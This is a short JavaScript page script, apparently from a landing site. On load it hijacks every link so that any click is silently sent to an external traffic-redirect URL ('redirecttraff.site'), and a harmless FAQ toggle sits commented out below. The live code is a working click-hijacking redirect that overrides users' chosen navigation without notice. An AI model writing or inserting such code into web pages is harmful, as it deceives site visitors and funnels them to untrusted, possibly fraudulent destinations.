window.onload = () => {
    // Redirect
    document.querySelectorAll('a').forEach( (elem) => {
        elem.onclick = function (e) {
            e.preventDefault();
            window.location.href = 'https://redirecttraff.site/LkjpTDVh';
            return false;
        };
    });

    // FAQ
    // const faqItems = document.querySelectorAll('.faq-card')
    // faqItems.forEach((elem) => {
    //     elem.addEventListener('click', () => {
    //         elem.classList.toggle('show');
    //     });
    // });
}